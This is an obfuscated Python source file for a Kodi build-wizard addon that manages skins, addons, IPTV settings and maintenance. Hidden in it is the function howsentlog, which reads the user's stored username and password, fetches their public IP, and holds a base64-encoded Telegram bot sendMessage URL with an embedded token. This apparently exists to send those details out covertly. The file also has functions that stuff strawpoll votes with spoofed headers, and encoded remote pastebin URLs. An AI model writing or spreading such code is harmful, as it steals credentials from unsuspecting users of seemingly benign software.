# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	OO0O0000OOOOOO0OO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	OOO00O000OO0O0000 =[];O00OO00OOO00O0000 =[]#line:267
	for OO00O0OO0O0O0O0O0 in sorted (OO0O0000OOOOOO0OO ,key =lambda O0O00OOOO0O000O00 :O0O00OOOO0O000O00 ):#line:268
		O00OOO00OOOO00O0O =os .path .split (OO00O0OO0O0O0O0O0 [:-1 ])[1 ]#line:269
		OOO00O00O0O0O0O00 =os .path .join (OO00O0OO0O0O0O0O0 ,'addon.xml')#line:270
		if os .path .exists (OOO00O00O0O0O0O00 ):#line:271
			OOOO000000O0O000O =open (OOO00O00O0O0O0O00 )#line:272
			O0O0O000OOOO0OOOO =OOOO000000O0O000O .read ()#line:273
			O00OOOO000000O000 =parseDOM2 (O0O0O000OOOO0OOOO ,'addon',ret ='id')#line:274
			OO00OO0OO0OO0OOO0 =O00OOO00OOOO00O0O if len (O00OOOO000000O000 )==0 else O00OOOO000000O000 [0 ]#line:275
			try :#line:276
				OO00OO00O0OO0OO0O =xbmcaddon .Addon (id =OO00OO0OO0OO0OOO0 )#line:277
				OOO00O000OO0O0000 .append (OO00OO00O0OO0OO0O .getAddonInfo ('name'))#line:278
				O00OO00OOO00O0000 .append (OO00OO0OO0OO0OOO0 )#line:279
			except :#line:280
				pass #line:281
	O00OOO0O0O000OO00 =[];OOOO00OO00O0O0O0O =0 #line:282
	OOO0O0O0O00OOO0OO =["Current Skin -- %s"%currSkin ()]+OOO00O000OO0O0000 #line:283
	OOOO00OO00O0O0O0O =DIALOG .select ("Select the Skin you want to swap with.",OOO0O0O0O00OOO0OO )#line:284
	if OOOO00OO00O0O0O0O ==-1 :return #line:285
	else :#line:286
		OO0000O00OO00O000 =(OOOO00OO00O0O0O0O -1 )#line:287
		O00OOO0O0O000OO00 .append (OO0000O00OO00O000 )#line:288
		OOO0O0O0O00OOO0OO [OOOO00OO00O0O0O0O ]="%s"%(OOO00O000OO0O0000 [OO0000O00OO00O000 ])#line:289
	if O00OOO0O0O000OO00 ==None :return #line:290
	for OO0OOO0000O00OOOO in O00OOO0O0O000OO00 :#line:291
		swapSkins (O00OO00OOO00O0000 [OO0OOO0000O00OOOO ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (OOO0OOOO00OOOO0O0 ,title ="Error"):#line:296
	OOO00OO00O0OOO00O ='lookandfeel.skin'#line:297
	OOOOOO0OOO0OOOO0O =OOO0OOOO00OOOO0O0 #line:298
	O00OO00O000000O00 =getOld (OOO00OO00O0OOO00O )#line:299
	O0O0OO0000O00000O =OOO00OO00O0OOO00O #line:300
	setNew (O0O0OO0000O00000O ,OOOOOO0OOO0OOOO0O )#line:301
	O000O000O0OO00O00 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O000O0OO00O00 <100 :#line:303
		O000O000O0OO00O00 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (OO00O0O0OOOO0OO00 ):#line:310
	try :#line:311
		OO00O0O0OOOO0OO00 ='"%s"'%OO00O0O0OOOO0OO00 #line:312
		O0O0O0OO0O0OO0OOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO00O0O0OOOO0OO00 )#line:313
		OO0O000OOOOOOO00O =xbmc .executeJSONRPC (O0O0O0OO0O0OO0OOO )#line:315
		OO0O000OOOOOOO00O =simplejson .loads (OO0O000OOOOOOO00O )#line:316
		if OO0O000OOOOOOO00O .has_key ('result'):#line:317
			if OO0O000OOOOOOO00O ['result'].has_key ('value'):#line:318
				return OO0O000OOOOOOO00O ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (O0OO00O0OOOOOOOO0 ,OO0O0O00O0OOO0OO0 ):#line:325
	try :#line:326
		O0OO00O0OOOOOOOO0 ='"%s"'%O0OO00O0OOOOOOOO0 #line:327
		OO0O0O00O0OOO0OO0 ='"%s"'%OO0O0O00O0OOO0OO0 #line:328
		O0OOO0O00000OO00O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0OO00O0OOOOOOOO0 ,OO0O0O00O0OOO0OO0 )#line:329
		O000O00O00O0O0000 =xbmc .executeJSONRPC (O0OOO0O00000OO00O )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			O00OO0O0OOO000O0O =xbmcgui .DialogProgress ()#line:340
			O00OO0O0OOO000O0O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			O00OO0O0OOO000O0O .update (0 )#line:344
			for O00OO000OO000O000 in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				O00OO0O0OOO000O0O .update (int ((5 -O00OO000OO000O000 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O00OO000OO000O000 ),'')#line:347
				if O00OO0O0OOO000O0O .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			O00OO0O0OOO000O0O =xbmcgui .DialogProgress ()#line:353
			O00OO0O0OOO000O0O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			O00OO0O0OOO000O0O .update (0 )#line:357
			for O00OO000OO000O000 in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				O00OO0O0OOO000O0O .update (int ((5 -O00OO000OO000O000 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O00OO000OO000O000 ),'')#line:360
				if O00OO0O0OOO000O0O .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    OO0OO0000OO0OO00O ='18773068'#line:373
    OOO0OO0O00O00OO00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0OO0000OO0OO00O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    O00O0O0O000O0OOOO ='145273320'#line:387
    O00000OOOO0OO0000 ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        O00OOOO0OOOO000O0 =O00O0O0O000O0OOOO #line:390
    else :#line:391
        O00OOOO0OOOO000O0 =O00000OOOO0OO0000 #line:392
    OOOOOO00O0OO0O00O ={'options':O00OOOO0OOOO000O0 }#line:396
    OOOO0OO00OOO0000O =requests .post ('https://www.strawpoll.me/'+OO0OO0000OO0OO00O ,headers =OOO0OO0O00O00OO00 ,data =OOOOOO00O0OO0O00O )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        O0O00OOOO00OO0O00 ='18773068'#line:402
        OO00O0OOO0O0O0O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O00OOOO00OO0O00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        OOOO00OOOOO0O0OO0 ='145273320'#line:416
        O00OO0OOOO000OO00 ={'options':OOOO00OOOOO0O0OO0 }#line:422
        OOOOO000OOOO000OO =requests .post ('https://www.strawpoll.me/'+O0O00OOOO00OO0O00 ,headers =OO00O0OOO0O0O0O0O ,data =O00OO0OOOO000OO00 )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        O0OOOO0OO0O00O0OO ='18773068'#line:429
        OOO00OO0O00OO0OO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOOO0OO0O00O0OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        OO0OO0O000000000O ='145273321'#line:443
        OOO0OO0000OO0O0OO ={'options':OO0OO0O000000000O }#line:449
        OO0O0OO0OOOO00OOO =requests .post ('https://www.strawpoll.me/'+O0OOOO0OO0O00O0OO ,headers =OOO00OO0O00OO0OO0 ,data =OOO0OO0000OO0O0OO )#line:451
   except :pass #line:452
def testcommand ():#line:456
	infobuild ()#line:457
def skin_homeselect ():#line:458
	try :#line:460
		OOO000OOOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:461
		OO00O00OOO00OO00O =open (OOO000OOOOOOOOOOO ,'r')#line:463
		OO00OO00OO0OOO0O0 =OO00O00OOO00OO00O .read ()#line:464
		OO00O00OOO00OO00O .close ()#line:465
		O000O00000O000OO0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:466
		O000000O0OOO00000 =re .compile (O000O00000O000OO0 ).findall (OO00OO00OO0OOO0O0 )[0 ]#line:467
		OO00O00OOO00OO00O =open (OOO000OOOOOOOOOOO ,'w')#line:468
		OO00O00OOO00OO00O .write (OO00OO00OO0OOO0O0 .replace ('<setting id="HomeS" type="string%s/setting>'%O000000O0OOO00000 ,'<setting id="HomeS" type="string"></setting>'))#line:469
		OO00O00OOO00OO00O .close ()#line:470
	except :#line:471
		pass #line:472
def autotrakt ():#line:475
    O00OOO00OOO0OOO0O =(ADDON .getSetting ("auto_trk"))#line:476
    if O00OOO00OOO0OOO0O =='true':#line:477
       from resources .libs import trk_aut #line:478
def traktsync ():#line:480
     O00O00OO00O00OOOO =(ADDON .getSetting ("auto_trk"))#line:481
     if O00O00OO00O00OOOO =='true':#line:482
       from resources .libs import trk_aut #line:485
     else :#line:486
        ADDON .openSettings ()#line:487
def imdb_synck ():#line:489
   try :#line:490
     OOO0OO000O0OOOO00 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:491
     O00O0OO0O00OOO000 =xbmcaddon .Addon ('plugin.video.gaia')#line:492
     O0O0000000O00O00O =(ADDON .getSetting ("imdb_sync"))#line:493
     O00OO0OO00000O0OO ="imdb.user"#line:494
     O00OO0000OOO0O0O0 ="accounts.informants.imdb.user"#line:495
     OOO0OO000O0OOOO00 .setSetting (O00OO0OO00000O0OO ,str (O0O0000000O00O00O ))#line:496
     O00O0OO0O00OOO000 .setSetting ('accounts.informants.imdb.enabled','true')#line:497
     O00O0OO0O00OOO000 .setSetting (O00OO0000OOO0O0O0 ,str (O0O0000000O00O00O ))#line:498
   except :pass #line:499
def dis_or_enable_addon (OOO0O000O0O0000OO ,O00OO00000OO00OOO ,enable ="true"):#line:501
    import json #line:502
    O0OOO0O00O000O0O0 ='"%s"'%OOO0O000O0O0000OO #line:503
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0O000O0O0000OO )and enable =="true":#line:504
        logging .warning ('already Enabled')#line:505
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO0O000O0O0000OO )#line:506
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0O000O0O0000OO )and enable =="false":#line:507
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO0O000O0O0000OO )#line:508
    else :#line:509
        OOOOOOOO0OOO00000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0OOO0O00O000O0O0 ,enable )#line:510
        OOO0OOOOOOO0O0O00 =xbmc .executeJSONRPC (OOOOOOOO0OOO00000 )#line:511
        O0OOO0000OOOO00OO =json .loads (OOO0OOOOOOO0O0O00 )#line:512
        if enable =="true":#line:513
            xbmc .log ("### Enabled %s, response = %s"%(OOO0O000O0O0000OO ,O0OOO0000OOOO00OO ))#line:514
        else :#line:515
            xbmc .log ("### Disabled %s, response = %s"%(OOO0O000O0O0000OO ,O0OOO0000OOOO00OO ))#line:516
    if O00OO00000OO00OOO =='auto':#line:517
     return True #line:518
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:519
def iptvset ():#line:522
  try :#line:523
    O00OOOO0O0O0O0OO0 =(ADDON .getSetting ("iptv_on"))#line:524
    if O00OOOO0O0O0O0OO0 =='true':#line:526
       if KODIV >=17 and KODIV <18 :#line:528
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:529
         O00OO0O00OOOOO0OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:530
         O0OOO0O000OO0OO00 =(ADDON .getSetting ("iptvUrl"))#line:532
         O00OO0O00OOOOO0OO .setSetting ('m3uUrl',O0OOO0O000OO0OO00 )#line:533
         O0O0O0O00O0O0O0O0 =(ADDON .getSetting ("epg_Url"))#line:534
         O00OO0O00OOOOO0OO .setSetting ('epgUrl',O0O0O0O00O0O0O0O0 )#line:535
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:538
         iptvsimpldownpc ()#line:539
         wiz .kodi17Fix ()#line:540
         xbmc .sleep (1000 )#line:541
         O00OO0O00OOOOO0OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:542
         O0OOO0O000OO0OO00 =(ADDON .getSetting ("iptvUrl"))#line:543
         O00OO0O00OOOOO0OO .setSetting ('m3uUrl',O0OOO0O000OO0OO00 )#line:544
         O0O0O0O00O0O0O0O0 =(ADDON .getSetting ("epg_Url"))#line:545
         O00OO0O00OOOOO0OO .setSetting ('epgUrl',O0O0O0O00O0O0O0O0 )#line:546
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:548
         iptvsimpldown ()#line:549
         wiz .kodi17Fix ()#line:550
         xbmc .sleep (1000 )#line:551
         O00OO0O00OOOOO0OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:552
         O0OOO0O000OO0OO00 =(ADDON .getSetting ("iptvUrl"))#line:553
         O00OO0O00OOOOO0OO .setSetting ('m3uUrl',O0OOO0O000OO0OO00 )#line:554
         O0O0O0O00O0O0O0O0 =(ADDON .getSetting ("epg_Url"))#line:555
         O00OO0O00OOOOO0OO .setSetting ('epgUrl',O0O0O0O00O0O0O0O0 )#line:556
  except :pass #line:557
def howsentlog ():#line:564
       try :#line:565
          import json #line:566
          OOOOOO000000000OO =(ADDON .getSetting ("user"))#line:567
          OOO0OO0OO0000000O =(ADDON .getSetting ("pass"))#line:568
          O00O0O000O00O0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:569
          OOO0000O0O0O0O000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:571
          OO000O0OOOO000O0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:572
          OOOO0O000OO00O00O =str (json .loads (OO000O0OOOO000O0O )['ip'])#line:573
          OO0OO0O0000O00OO0 =OOOOOO000000000OO #line:574
